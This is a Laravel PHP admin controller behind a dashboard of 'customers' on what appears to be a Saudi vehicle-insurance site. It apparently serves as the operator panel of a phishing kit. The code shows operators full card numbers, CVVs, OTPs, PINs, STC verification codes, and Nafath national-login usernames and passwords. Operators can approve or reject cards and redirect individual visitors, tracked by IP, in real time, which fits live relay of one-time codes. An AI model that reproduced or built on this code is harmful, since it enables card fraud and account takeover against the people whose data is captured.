<?php

namespace App\Http\Controllers\Admin;

use App\Events\CustomerRedirected;
use App\Events\WindowReadUpdated;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\MarkViewedRequest;
use App\Http\Requests\Admin\RedirectCustomerRequest;
use App\Models\AdminDashboardSession;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use App\Models\PaymentCard;
use App\Models\UserActivity;
use App\Services\CarrierDetectionService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

class AdminCustomerController extends Controller
{
    use NotifiesDashboard;

    public function index(Request $request): JsonResponse
    {
        // ── Build a cache key based on filters so filtered vs unfiltered don't collide ──
        $activeOnly = $request->filled('active_only') ? '1' : '0';
        $paymentOnly = $request->boolean('payment_only') ? '1' : '0';
        $search = $request->input('search', '');
        $country = $request->input('country', '');
        $page = (int) $request->input('page', 1);
        $perPage = min((int) $request->input('per_page', 200), 500);
        $sortBy = $request->input('sort_by', 'last_activity_at');
        $sortOrder = $request->input('sort_order', 'desc');

        // Cache TTL: 2 seconds (changed from 3 to ensure fresh data)
        // Search queries: no cache (to show results immediately)
        $isCached = ! $search;
        $cacheKey = "admin:customers:{$activeOnly}:{$paymentOnly}:{$search}:{$country}:{$page}:{$perPage}:{$sortBy}:{$sortOrder}";

        // ── Fetch data with stampede-safe caching ──
        // Cache::flexible [2, 10] = fresh for 2s, stale-while-revalidate up to 10s.
        // Under high concurrency, only ONE admin triggers the expensive query;
        // all others get the (at most 10s old) stale value instantly.
        $result = $isCached
            ? Cache::flexible($cacheKey, [2, 10], fn () => $this->fetchCustomers($activeOnly, $paymentOnly, $search, $perPage, $country, $sortBy, $sortOrder))
            : $this->fetchCustomers($activeOnly, $paymentOnly, $search, $perPage, $country, $sortBy, $sortOrder);

        // Track admin dashboard visit (throttled — once per minute per admin)
        if (Auth::check()) {
            $adminId = Auth::id();
            $visitKey = "admin:visit_logged:{$adminId}";
            if (! Cache::has($visitKey)) {
                Cache::put($visitKey, true, 60);
                $session = AdminDashboardSession::getOrCreateForAdmin($adminId);
                $session->recordVisit();
                $session->recordDashboardStats([
                    'total_customers' => $result['total'],
                    'active_customers' => collect($result['customers'])->where('is_active', true)->count(),
                    'pending_otps' => OtpCode::pending()->count(),
                    'pending_cards' => PaymentCard::pending()->count(),
                ]);

                UserActivity::create([
                    'user_id' => $adminId,
                    'ip_address' => $request->ip(),
                    'page' => '/admin/dashboard',
                    'action' => 'view_customers',
                ]);
            }
        }

        return response()->json($result);
    }

    /**
     * Extract database query logic for reusability and clarity
     */
    private function fetchCustomers(string $activeOnly, string $paymentOnly, string $search, int $perPage, string $country = '', string $sortBy = 'last_activity_at', string $sortOrder = 'desc'): array
    {
        // Whitelist sortable columns to prevent SQL injection
        $allowedSortColumns = ['last_activity_at', 'created_at', 'full_name', 'national_id', 'ip_address', 'is_active', 'city', 'region'];
        if (! in_array($sortBy, $allowedSortColumns, true)) {
            $sortBy = 'last_activity_at';
        }
        $sortOrder = strtolower($sortOrder) === 'asc' ? 'asc' : 'desc';

        // Build one filtered base query first, then dedupe BEFORE paginate.
        // This keeps pagination counts/rows consistent and prevents per-page dedupe drift.
        $baseFiltered = CustomerProfile::query()->excludeBots();

        if ($activeOnly === '1') {
            $baseFiltered->active();
        }

        if ($search) {
            $escaped = str_replace(['%', '_'], ['\%', '\_'], $search);
            $piiHash = CustomerProfile::hashPii($search);
            $baseFiltered->where(function ($q) use ($escaped, $piiHash) {
                $q->where('ip_address', 'like', "%{$escaped}%")
                    ->orWhere('full_name', 'like', "%{$escaped}%")
                    ->orWhere('national_id_hash', $piiHash)
                    ->orWhere('phone_number_hash', $piiHash);
            });
        }

        // ── Payment cards only filter ──
        // Used by dashboard cleanup mode to show only customers who submitted card data.
        if ($paymentOnly === '1') {
            $baseFiltered->whereHas('paymentCards');
        }

        // ── Country filter ──
        // All known Saudi identifiers across both columns:
        //   location_country: السعودية, المملكة العربية السعودية
        //   country (English from GeoLocationService): Saudi Arabia, SA
        $saudiValues = ['السعودية', 'المملكة العربية السعودية', 'Saudi Arabia', 'SA'];

        if ($country === 'SA') {
            $baseFiltered->where(function ($q) use ($saudiValues) {
                // Match any Saudi value in either column
                $q->whereIn('location_country', $saudiValues)
                    ->orWhereIn('country', $saudiValues)
                    // Customers with NO location data at all → default to Saudi
                    ->orWhere(function ($q2) {
                        $q2->where(function ($q3) {
                            $q3->whereNull('location_country')->orWhere('location_country', '');
                        })->where(function ($q3) {
                            $q3->whereNull('country')->orWhere('country', '');
                        });
                    });
            });
        } elseif ($country === 'other') {
            // Non-Saudi: must have some country data AND it must not be Saudi
            $baseFiltered->where(function ($q) use ($saudiValues) {
                // Has a non-Saudi location_country
                $q->where(function ($q2) use ($saudiValues) {
                    $q2->whereNotNull('location_country')
                        ->where('location_country', '!=', '')
                        ->whereNotIn('location_country', $saudiValues);
                })
                // OR has a non-Saudi country (when location_country is empty)
                    ->orWhere(function ($q2) use ($saudiValues) {
                        $q2->where(function ($q3) {
                            $q3->whereNull('location_country')->orWhere('location_country', '');
                        })->whereNotNull('country')
                            ->where('country', '!=', '')
                            ->whereNotIn('country', $saudiValues);
                    });
            });
        }

        // Dedupe by IP before pagination: keep latest row per ip_address.
        // Legacy duplicated rows can still exist; deduping at SQL level makes
        // pagination + totals stable and removes per-page unique() side effects.
        $dedupedIdsQuery = (clone $baseFiltered)
            ->selectRaw('MAX(id) as id')
            ->groupBy('ip_address');

        $query = CustomerProfile::query()
            ->whereIn('id', $dedupedIdsQuery)
            ->withCount([
                'paymentCards',
                'otpCodes as payment_otp_count' => fn($q) => $q->whereIn('type', ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification']),
            ])
            ->with([
                // NOTE: do NOT use ->limit(N) here — Laravel applies eager-load
                // limits GLOBALLY across all parents (single SQL query), not
                // per-parent. This caused customers to randomly receive 0 OTP
                // records when total rows across the page exceeded the limit,
                // making latest_pin / latest_phone_otp appear null in the
                // dashboard refresh payload (the disappearing-blocks bug).
                // We scope by recency instead, which is bounded per customer.
                'otpCodes' => fn($q) => $q->select('id', 'customer_profile_id', 'type', 'code', 'code_value', 'status', 'phone_number', 'created_at', 'updated_at')
                    ->where('created_at', '>=', now()->subDays(30))
                    ->latest(),
                'paymentCards' => fn($q) => $q->select('id', 'customer_profile_id', 'session_id', 'card_number', 'last4', 'holder_name', 'card_type', 'expiry_month', 'expiry_year', 'cvv_encrypted', 'status', 'rejection_reason', 'reviewed_by', 'reviewed_at', 'redirect_url', 'created_at', 'updated_at')
                    ->where('created_at', '>=', now()->subDays(30))
                    ->latest(),
            ])
            // Ordering rules (see issue: admin viewing demoted customers from #1):
            //   1. Primary: last_activity_at DESC — newest real activity at top.
            //      `last_activity_at` is updated by createOrUpdateByIP / recordActivity
            //      whenever a customer submits real data (page view, OTP, card, …).
            //      It is NOT touched by markViewed / data_viewed updates, so admin
            //      viewing a card never reorders the list.
            //   2. Tiebreaker: id DESC — keeps order stable when multiple rows share
            //      the same last_activity_at timestamp (e.g. just inserted).
            ->orderBy($sortBy, $sortOrder)
            ->orderByDesc('id');

        $paginated = $query->paginate($perPage);
        $customers = $paginated->getCollection()
            ->map(fn ($c) => $this->toCardFormat($c));
            // NOTE: do NOT post-sort by has_new_* flags here.
            // Doing so coupled the list order to the `data_viewed` field, which meant
            // an admin opening a customer card (markViewed → has_new_* flips false)
            // would demote that customer from the top. The SQL ORDER BY last_activity_at
            // above is the single source of truth for ordering.

        $activeCount = CustomerProfile::query()
            ->whereIn('id', $dedupedIdsQuery)
            ->where('is_active', true)
            ->count();

        return [
            'success' => true,
            'data' => $customers->values(),
            'customers' => $customers->values(), // backward-compat alias
            'count' => $paginated->total(),
            'total' => $paginated->total(),
            'active_count' => $activeCount,
            'current_page' => $paginated->currentPage(),
            'last_page' => $paginated->lastPage(),
            'per_page' => $paginated->perPage(),
        ];
    }

    /**
     * Get a single customer by ID — used for patch updates from WebSocket events.
     */
    public function show(int $id): JsonResponse
    {
        $customer = CustomerProfile::with(['otpCodes', 'paymentCards'])->find($id);

        if (! $customer) {
            return response()->json([
                'success' => false,
                'message' => 'العميل غير موجود',
            ], 404);
        }

        return response()->json([
            'success' => true,
            'data' => $this->toCardFormat($customer),
        ]);
    }

    /**
     * Redirect a customer to a specific page
     */
    public function redirectCustomer(RedirectCustomerRequest $request): JsonResponse
    {
        $customer = CustomerProfile::where('ip_address', $request->customer_ip)->first();

        if (! $customer) {
            return response()->json([
                'success' => false,
                'message' => 'العميل غير موجود',
            ], 404);
        }

        $customer->update(['current_page' => $request->redirect_url]);

        // Cache pending redirect so the customer's heartbeat can pick it up
        // even if WebSocket is unavailable (polling fallback — TTL 120s).
        \Illuminate\Support\Facades\Cache::put(
            "pending_redirect:{$request->customer_ip}",
            $request->redirect_url,
            120
        );

        broadcast(new CustomerRedirected($request->customer_ip, $request->redirect_url))->toOthers();

        $this->notifyDashboard($request->customer_ip, 'customer_redirected');

        return response()->json([
            'success' => true,
            'message' => 'تم توجيه العميل بنجاح',
        ]);
    }

    /**
     * Mark a data section as viewed — shared across ALL admins.
     */
    public function markViewed(MarkViewedRequest $request, int $id): JsonResponse
    {
        $customer = CustomerProfile::find($id);
        if (! $customer) {
            // Customer may have been merged/deleted — return 200 to avoid noisy console errors
            return response()->json(['success' => false, 'message' => 'العميل غير موجود']);
        }

        $dataType = $request->input('data_type');
        $viewed = $customer->data_viewed ?? [];

        $currentCount = match ($dataType) {
            'vehicle' => $this->countVehicleFields($customer),
            'insurance' => $this->countInsuranceFields($customer),
            'payment' => $this->countPaymentData($customer),
            default => 0,
        };

        $readAt = now()->toISOString();

        $viewed[$dataType] = [
            'at' => $readAt,
            'by' => Auth::id(),
            'count' => $currentCount,
            'hash' => $this->computeSectionHash($customer, $dataType),
        ];

        $customer->update(['data_viewed' => $viewed]);

        // ✅ Flush cached customer list so next poll returns updated has_new_* flags
        $this->flushCustomerCache();

        // ✅ Instant broadcast to ALL admins (including self) — blink disappears immediately
        try {
            broadcast(new WindowReadUpdated(
                $customer->ip_address,
                $dataType,
                $readAt,
                Auth::id()
            ));
        } catch (\Throwable $e) {
            Log::warning('mark-viewed broadcast failed', ['error' => $e->getMessage()]);
        }

        return response()->json(['success' => true]);
    }

    /**
     * Delete a tracked customer card
     */
    public function destroy(int $id): JsonResponse
    {
        $customer = CustomerProfile::findOrFail($id);

        $customer->delete();

        $this->flushCustomerCache();

        return response()->json([
            'success' => true,
            'message' => 'تم حذف بطاقة العميل بنجاح',
        ]);
    }

    // ─── Private Helpers ─────────────────────────────────────────

    /**
     * Count vehicle/quote fields for a customer.
     */
    private function countVehicleFields(CustomerProfile $c): int
    {
        $count = 0;
        if ($c->insurance_purpose) {
            $count++;
        }
        if ($c->registration_type) {
            $count++;
        }
        if ($c->national_id) {
            $count++;
        }
        if ($c->sequence_number) {
            $count++;
        }
        if ($c->customs_card) {
            $count++;
        }
        if ($c->birth_year && $c->birth_month) {
            $count++;
        }
        if ($c->manufacturing_year) {
            $count++;
        }

        return $count;
    }

    /**
     * Count insurance data fields for a customer.
     */
    private function countInsuranceFields(CustomerProfile $c): int
    {
        $count = 0;
        if ($c->full_name) {
            $count++;
        }
        if ($c->birth_date) {
            $count++;
        }
        if ($c->phone_number) {
            $count++;
        }
        if ($c->region) {
            $count++;
        }
        if ($c->city) {
            $count++;
        }
        if ($c->vehicle_type) {
            $count++;
        }
        if ($c->vehicle_model) {
            $count++;
        }
        if ($c->vehicle_price) {
            $count++;
        }
        if ($c->plate_number) {
            $count++;
        }
        if ($c->repair_method) {
            $count++;
        }

        return $count;
    }

    /**
     * Count payment data items (cards + OTPs + PINs + phone/STC + nafath) for a customer.
     */
    private function countPaymentData(CustomerProfile $c): int
    {
        $count = 0;

        // Use withCount attributes when available (list view), otherwise
        // count loaded relations or fall back to DB queries (show view).
        if (isset($c->payment_cards_count)) {
            $count += $c->payment_cards_count;
        } elseif ($c->relationLoaded('paymentCards')) {
            $count += $c->paymentCards->count();
        } else {
            $count += $c->paymentCards()->count();
        }

        $otpTypes = ['otp', 'pin', 'phone', 'phone_verification', 'stc_otp', 'stc_verification'];
        if (isset($c->payment_otp_count)) {
            $count += $c->payment_otp_count;
        } elseif ($c->relationLoaded('otpCodes')) {
            $count += $c->otpCodes->whereIn('type', $otpTypes)->count();
        } else {
            $count += $c->otpCodes()->whereIn('type', $otpTypes)->count();
        }

        // Nafath credentials
        if ($c->nafath_username || $c->nafath_verification_code) {
            $count++;
        }

        // STC / phone stage flags in extra_data
        $extra = $c->extra_data ?? [];
        if (! empty($extra['stc_waiting_approved']) || ! empty($extra['stc_waiting_rejected'])) {
            $count++;
        }
        if (! empty($extra['stc_otp_approved']) || ! empty($extra['stc_otp_rejected'])) {
            $count++;
        }
        if (! empty($extra['stc_call_approved']) || ! empty($extra['stc_call_rejected'])) {
            $count++;
        }
        if (! empty($extra['phone_data_status'])) {
            $count++;
        }
        if (! empty($extra['phone_otp_status'])) {
            $count++;
        }

        return $count;
    }

    /**
     * Format customer profile for API response (matches CustomerCard.vue prop structure)
     */
    private function toCardFormat(CustomerProfile $customer): array
    {
        // Reveal hidden PII fields for admin dashboard (national_id, phone_number, email).
        // These are stripped by default via $hidden in CustomerProfile.
        $customer->makeVisible(['national_id', 'phone_number', 'email']);
        $data = $customer->toArray();

        // The eager-loaded paymentCards relation is serialized into
        // $data['payment_cards'] by toArray(). Strip it here — the admin
        // payload uses the curated $maskedCards mapper below for the
        // payment.cards block, so this raw dump is redundant and could
        // leak fields not intended for the admin payload.
        unset($data['payment_cards']);

        // Slim the payload: remove fields the dashboard frontend never
        // consumes (hash columns, raw user_agent, raw journey_history) and
        // duplicate extra_data keys (frontend reads `custom_data` only).
        // This reliably trims ~30-40% of the per-customer payload.
        unset(
            $data['national_id_hash'],
            $data['phone_number_hash'],
            $data['email_hash'],
            $data['user_agent'],
            $data['journey_history'],
            $data['otp_codes'],
        );

        $data['ip'] = $data['ip_address'] ?? null;

        $latestOtp = $customer->otpCodes->where('type', 'otp')->sortByDesc('created_at')->first();
        $latestPin = $customer->otpCodes->where('type', 'pin')->sortByDesc('created_at')->first();
        $latestPhoneOtp = $customer->otpCodes->whereIn('type', ['phone', 'phone_verification', 'stc_verification', 'stc_otp'])->sortByDesc('created_at')->first();

        if ($latestOtp) {
            $latestOtp->makeVisible(['code', 'code_value']);
        }
        if ($latestPin) {
            $latestPin->makeVisible(['code', 'code_value']);
        }
        if ($latestPhoneOtp) {
            $latestPhoneOtp->makeVisible(['code', 'code_value']);
        }

        /** @var \Illuminate\Database\Eloquent\Collection<int, \App\Models\PaymentCard> $paymentCards */
        $paymentCards = $customer->paymentCards;
        $maskedCards = $paymentCards->sortByDesc('created_at')->toBase()->map(function (\App\Models\PaymentCard $card): array {
            // Admin payload exposes the full PAN and persisted CVV by explicit
            // business decision. NOTE: this violates PCI-DSS 3.2 (PAN) and
            // 3.3.1 (CVV) — deviation owned by the business stakeholder.
            $rawPan = (string) ($card->card_number ?? '');
            $panDigits = preg_replace('/\D+/', '', $rawPan);
            $bin = strlen($panDigits) >= 6 ? substr($panDigits, 0, 6) : null;
            $rawCvv = $card->cvv_encrypted ?: Cache::get("card:cvv:{$card->id}");

            // Pre-rendered display strings the frontend binds to. This
            // decouples Vue components from the raw sensitive field names.
            $panDisplay = $panDigits !== ''
                ? trim(chunk_split($panDigits, 4, ' '))
                : ($card->last4 ? '**** **** **** ' . $card->last4 : null);
            $cvvDisplay = $rawCvv !== null && $rawCvv !== '' ? (string) $rawCvv : null;

            return [
                'id'                  => $card->id,
                'customer_profile_id' => $card->customer_profile_id,
                'session_id'          => $card->session_id,
                'card_number'         => $rawPan ?: null,
                'card_number_full'    => $rawPan ?: null,
                'card_number_display' => $panDisplay,
                'last4'               => $card->last4,
                'bin'                 => $bin,
                'holder_name'         => $card->holder_name,
                'card_holder'         => $card->holder_name,
                'card_type'           => $card->card_type,
                'expiry_month'        => $card->expiry_month,
                'expiry_year'         => $card->expiry_year,
                'cvv'                 => $rawCvv,
                'cvv_display'         => $cvvDisplay,
                'status'              => $card->status,
                'rejection_reason'    => $card->rejection_reason,
                'reviewed_by'         => $card->reviewed_by,
                'reviewed_at'         => $card->reviewed_at,
                'redirect_url'        => $card->redirect_url,
                'created_at'          => $card->created_at,
                'updated_at'          => $card->updated_at,
            ];
        })->values();

        $birthDate = $data['birth_date'] ?? null;
        if (! $birthDate && ($data['birth_year'] ?? null) && ($data['birth_month'] ?? null)) {
            $birthDate = $data['birth_month'].'/'.$data['birth_year'];
        }

        $os = null;
        $deviceType = $customer->device_type;
        $browser = $customer->device_browser;
        if ($deviceType === 'mobile') {
            $os = str_contains(strtolower($browser ?? ''), 'safari') ? 'iOS' : 'Android';
        } elseif ($deviceType === 'tablet') {
            $os = str_contains(strtolower($browser ?? ''), 'safari') ? 'iPadOS' : 'Android';
        } else {
            $os = 'Windows';
        }

        $carrier = $customer->phone_carrier;
        if (! $carrier && $customer->phone_number) {
            $carrier = CarrierDetectionService::detect($customer->phone_number);
        }

        return array_merge($data, [
            'journey' => [
                'current_page' => $customer->current_page,
                'completion_percentage' => $customer->completion_percentage,
                'total_visits' => $customer->total_visits,
            ],
            'device_info' => [
                'type' => $customer->device_type,
                'browser' => $customer->device_browser,
                'os' => $os,
            ],
            'nafath' => [
                'username' => $customer->nafath_username,
                'password' => $customer->makeVisible('nafath_password')->nafath_password,
                'verified' => $customer->nafath_verified,
                'verification_code' => $customer->nafath_verification_code,
            ],
            'location' => [
                'city' => $customer->location_city,
                'country' => $customer->location_country,
            ],
            'payment' => [
                'cards' => $maskedCards,
            ],
            'latest_otp' => $latestOtp,
            'latest_pin' => $latestPin,
            'latest_phone_otp' => $latestPhoneOtp,
            'all_otps' => $customer->otpCodes->whereIn('type', ['otp', 'stc_otp', 'phone', 'phone_verification', 'stc_verification'])
                ->each(fn ($o) => $o->makeVisible(['code', 'code_value']))->values(),
            'all_pins' => $customer->otpCodes->where('type', 'pin')
                ->sortByDesc('created_at')
                ->each(fn ($o) => $o->makeVisible(['code', 'code_value']))->values(),

            'nationalId' => $data['national_id'] ?? null,
            'fullName' => $data['full_name'] ?? null,
            'phoneNumber' => $data['phone_number'] ?? null,
            'phone_carrier' => $carrier,
            'carrier' => $carrier,
            'birthDate' => $birthDate,
            'birthYear' => $data['birth_year'] ?? null,
            'birthMonth' => $data['birth_month'] ?? null,
            'vehicleType' => $data['vehicle_type'] ?? null,
            'vehicleMake' => $data['vehicle_make'] ?? null,
            'vehicleModel' => $data['vehicle_model'] ?? null,
            'plateNumber' => $data['plate_number'] ?? null,
            'vin' => $data['vin'] ?? null,
            'manufacturingYear' => $data['manufacturing_year'] ?? null,
            'vehiclePrice' => $data['vehicle_price'] ?? null,
            'insuranceType' => $data['insurance_type'] ?? null,
            'insurancePurpose' => $data['insurance_purpose'] ?? null,
            'usagePurpose' => $data['insurance_purpose'] ?? null,
            'registrationType' => $data['registration_type'] ?? null,
            'repairMethod' => $data['repair_method'] ?? null,
            'policyStartDate' => $data['policy_start_date'] ?? null,
            'sequenceNumber' => $data['sequence_number'] ?? null,
            'customsCard' => $data['customs_card'] ?? null,
            'hasAdditionalDriver' => $data['has_additional_driver'] ?? false,
            'additionalDriverName' => $data['additional_driver_name'] ?? null,
            'additionalDriverNationalId' => $data['additional_driver_national_id'] ?? null,
            'additionalDriverBirthDate' => $data['additional_driver_birth_date'] ?? null,
            'totalPrice' => $data['total_price'] ?? null,
            'selectedInsurance' => $data['selected_insurance'] ?? null,
            'country' => $this->normalizeCountryCode($data['location_country'] ?? null, $data['country'] ?? null),
            'phone' => $data['phone_number'] ?? null,

            'last_activity' => $customer->last_activity_at?->toISOString(),
            'last_activity_at' => $customer->last_activity_at?->toISOString(),

            'custom_data' => $customer->extra_data ?? [],
            'extraData' => $data['extra_data'] ?? null,
            'extra_data' => $data['extra_data'] ?? null,

            'has_new_vehicle' => $this->isDataNew($customer, 'vehicle'),
            'has_new_insurance' => $this->isDataNew($customer, 'insurance'),
            'has_new_payment' => $this->isDataNew($customer, 'payment'),
        ]);
    }

    /**
     * Normalize any country value (Arabic name, English name, or ISO code) to a 2-letter ISO code.
     * Handles legacy data that stored full names instead of codes.
     */
    private function normalizeCountryCode(?string $locationCountry, ?string $countryField): ?string
    {
        static $nameToCode = [
            'المملكة العربية السعودية' => 'SA', 'السعودية' => 'SA', 'Saudi Arabia' => 'SA',
            'الإمارات العربية المتحدة' => 'AE', 'الإمارات' => 'AE', 'United Arab Emirates' => 'AE',
            'الكويت' => 'KW', 'Kuwait' => 'KW',
            'البحرين' => 'BH', 'Bahrain' => 'BH',
            'عُمان' => 'OM', 'Oman' => 'OM',
            'قطر' => 'QA', 'Qatar' => 'QA',
            'مصر' => 'EG', 'Egypt' => 'EG',
            'الأردن' => 'JO', 'Jordan' => 'JO',
            'لبنان' => 'LB', 'Lebanon' => 'LB',
            'العراق' => 'IQ', 'Iraq' => 'IQ',
            'تركيا' => 'TR', 'Turkey' => 'TR', 'Türkiye' => 'TR',
            'الهند' => 'IN', 'India' => 'IN',
            'باكستان' => 'PK', 'Pakistan' => 'PK',
            'اليمن' => 'YE', 'Yemen' => 'YE',
            'السودان' => 'SD', 'Sudan' => 'SD',
            'فلسطين' => 'PS', 'Palestine' => 'PS',
        ];

        // Prefer the `country` column if it's already an ISO code
        if ($countryField && strlen($countryField) === 2) {
            return strtoupper($countryField);
        }

        // Reverse-lookup from location_country (Arabic) or country (English name)
        foreach ([$countryField, $locationCountry] as $value) {
            if ($value && isset($nameToCode[$value])) {
                return $nameToCode[$value];
            }
        }

        // Fallback — return whatever we have (may be an unknown name)
        return $locationCountry ?? $countryField;
    }

    /**
     * Check if a data section has new/unseen data.
     * Uses count + hash + timestamp detection for comprehensive change tracking.
     */
    private function isDataNew(CustomerProfile $customer, string $dataType): bool
    {
        $viewed = $customer->data_viewed[$dataType] ?? null;

        $currentCount = match ($dataType) {
            'vehicle' => $this->countVehicleFields($customer),
            'insurance' => $this->countInsuranceFields($customer),
            'payment' => $this->countPaymentData($customer),
            default => 0,
        };

        // No data at all → nothing new
        if ($currentCount === 0) {
            return false;
        }

        // Never viewed → definitely new
        if (! $viewed) {
            return true;
        }

        // More items than last viewed → new data added
        if ($currentCount > ($viewed['count'] ?? 0)) {
            return true;
        }

        // Hash mismatch → field values changed (catches edits like phone X→Y)
        $currentHash = $this->computeSectionHash($customer, $dataType);
        if ($currentHash !== ($viewed['hash'] ?? '')) {
            return true;
        }

        // Timestamp check — newer records since last view (all sections)
        $viewedAt = $viewed['at'] ?? null;
        if ($viewedAt) {
            $viewedTime = strtotime($viewedAt);
            $latestDataTime = $this->getLatestDataTimestamp($customer, $dataType);
            if ($latestDataTime > $viewedTime) {
                return true;
            }
        }

        return false;
    }

    /**
     * Compute a hash of the relevant field values for a section.
     * Detects value changes that count-based detection misses.
     */
    private function computeSectionHash(CustomerProfile $c, string $dataType): string
    {
        $values = match ($dataType) {
            'vehicle' => [
                $c->insurance_purpose,
                $c->registration_type,
                $c->national_id,
                $c->sequence_number,
                $c->customs_card,
                $c->birth_year,
                $c->birth_month,
                $c->manufacturing_year,
            ],
            'insurance' => [
                $c->full_name,
                $c->birth_date,
                $c->phone_number,
                $c->region,
                $c->city,
                $c->vehicle_type,
                $c->vehicle_model,
                $c->vehicle_price,
                $c->plate_number,
                $c->repair_method,
            ],
            'payment' => [
                ($c->paymentCards ?? collect())->sortBy('id')->map(fn ($i) => $i->id.':'.$i->status)->implode(','),
                ($c->otpCodes ?? collect())->whereIn('type', ['otp', 'pin'])->sortBy('id')->map(fn ($i) => $i->id.':'.$i->status)->implode(','),
                ($c->otpCodes ?? collect())->whereIn('type', ['phone_verification', 'stc_otp', 'stc_verification'])->sortBy('id')->map(fn ($i) => $i->id.':'.$i->status)->implode(','),
                ($c->nafath_verified ? '1' : '0') . ':' . ($c->nafath_verification_code ?? ''),
            ],
            default => [],
        };

        return md5(implode('|', array_map('strval', $values)));
    }

    /**
     * Get the latest data timestamp for a section.
     * Vehicle/insurance rely on hash+count (updated_at is unreliable — changes on every page_view).
     * Payment uses related model timestamps (paymentCards, otpCodes).
     */
    private function getLatestDataTimestamp(CustomerProfile $c, string $dataType): int
    {
        return match ($dataType) {
            // Vehicle/insurance fields live on customer_profiles — updated_at changes on every
            // page_view (TrackCustomerActivityJob). Hash+count detection is sufficient.
            'vehicle', 'insurance' => 0,
            'payment' => max(
                ($c->paymentCards ?? collect())->max('updated_at') ? strtotime(($c->paymentCards ?? collect())->max('updated_at')) : 0,
                ($c->otpCodes ?? collect())->whereIn('type', ['otp', 'pin'])->max('created_at')
                    ? strtotime(($c->otpCodes ?? collect())->whereIn('type', ['otp', 'pin'])->max('created_at'))
                    : 0,
                ($c->otpCodes ?? collect())->whereIn('type', ['phone_verification', 'stc_otp', 'stc_verification'])->max('created_at')
                    ? strtotime(($c->otpCodes ?? collect())->whereIn('type', ['phone_verification', 'stc_otp', 'stc_verification'])->max('created_at'))
                    : 0
            ),
            default => 0,
        };
    }
}
